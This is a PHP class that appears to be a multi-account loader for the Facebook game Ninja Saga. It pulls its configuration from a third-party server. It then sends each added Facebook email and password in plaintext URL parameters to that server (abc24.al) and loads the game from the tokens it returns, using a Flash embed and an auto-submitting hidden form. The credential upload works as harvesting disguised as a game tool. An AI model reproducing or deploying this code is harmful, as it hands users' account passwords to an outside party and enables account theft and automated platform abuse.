<?php

	class accountLoader{
	
		private $accounts;
		private $threads=10; //number of connections at the same time
		private static $iframe=0;
		private $accountData;
		
		//constructor function
		function __construct($threads=10){
			$this->threads=$threads;
			$this->accounts=array();

			$content=file_get_contents("http://abc24.al/cj/NScripters.php?config");
			if($content==""){die("This script its outdated. Please contact admin: https://facebook.com/Flash.NScripters");}
			$this->accountData=json_decode($content);
			client_library::setKey($this->accountData->client_library_key);
		}
		
		//add Facebook Accounts into array
		public function addAccount($email,$pass){
			array_push($this->accounts,array($email,$pass));
			return $this;
		}

		//set and get of threads variable
		public function setThreadsNr($nr){
			$this->threads=$nr;
			return $this;
		}
		
		public function getThreadsNr(){
			return $this->threads;
		}
		
		//async http-get , get all accounts flashvars
		public function getAccountData($callback){
			$urls=array();
			$l=count($this->accounts);
			$threads=($l>$this->threads)?$this->threads:$l;
			for($i=0;$i<$l;$i++){array_push($urls,"http://abc24.al/cj/NScripters.php?email=".$this->accounts[$i][0]."&pass=".$this->accounts[$i][1]);}

			$master=curl_multi_init();
			$curl_arr=array();

			// add curl options
			$options=array(
				CURLOPT_RETURNTRANSFER=>true,
				//CURLOPT_FOLLOWLOCATION=>true,
				CURLOPT_MAXREDIRS=>5
			);
			
			// start first requests
			for($i=0;$i<$threads;$i++){
				$ch=curl_init();
				$options[CURLOPT_URL]=$urls[$i];
				curl_setopt_array($ch,$options);
				curl_multi_add_handle($master,$ch);
			}

			do{
				while(($execrun=curl_multi_exec($master,$running))==CURLM_CALL_MULTI_PERFORM);
				if($execrun!=CURLM_OK) break;
				// a request was just completed -- find out which one
				while($done=curl_multi_info_read($master)){
					$info=curl_getinfo($done['handle']);
					if($info['http_code']==200){
						$output=curl_multi_getcontent($done['handle']);

						// request successful.  process output using the callback function.
						$account=json_decode($output);
						
						//sets the right swf version, if error 102 encounter
						if(isset($_SESSION['swf_version'])){
							$account->swf_version=$_SESSION['swf_version'];
						}
						//call the callback function
						$callback(((object)array_merge((array)$account,(array)$this->accountData)));

						// start a new request (it's important to do this before removing the old one)
						if($i<$l){
							$ch=curl_init();
							$options[CURLOPT_URL]=$urls[$i++];  // increment i
							curl_setopt_array($ch,$options);
							curl_multi_add_handle($master, $ch);
						}
						
						// remove the curl handle that just completed
						curl_multi_remove_handle($master,$done['handle']);
					}else{
						// request failed.  add error handling.
					}
				}
			} while($running);
			
			curl_multi_close($master);
		}
		
		public static function loadGame($account){
			echo "
				<object type=\"application/x-shockwave-flash\" id=\"ns_swf\" data=\"".$account->swf_url."\" width=\"750\" height=\"610\"><param name=\"scale\" value=\"showall\"><param name=\"wmode\" value=\"transparent\"><param name=\"allowscriptaccess\" value=\"always\"><param name=\"callback\" value=\"function (success) {sizeChangeCallback();}\">
				<param name=\"flashvars\" value=\"client_version=".$account->client_version."&amp;lang=".$account->lang."&amp;fb_at=".$account->fb_at."&amp;fb_uid=".$account->fb_uid."&amp;fb_name=".$account->fb_name."&amp;fb_sig=".$account->fb_sig."&amp;time=".$account->time."&amp;hash_time=".$account->hash_time."\"></object>
				<br><br>
			";
		}
		public static function loadIframe($account){
			echo "
				<form id=\"iframe".self::$iframe."\" action=\"https://app.ninjasaga.com/fb_en/?fb_source=bookmark&amp;ref=bookmarks&amp;count=0&amp;fb_bmpos=_0\" method=\"post\" target=\"iframe".self::$iframe."\"><input type=\"hidden\" autocomplete=\"off\" name=\"signed_request\" value=\"".$account->signed_request."\"><input type=\"hidden\" autocomplete=\"off\" name=\"fb_locale\" value=\"en_US\"></form>
				<iframe name=\"iframe".self::$iframe."\" style=\"height:630px; width:770px;\"></iframe>
				<script>document.getElementById('iframe".self::$iframe."').submit();</script>
				<br><br>
			";
			self::$iframe++;
		}
	}

?>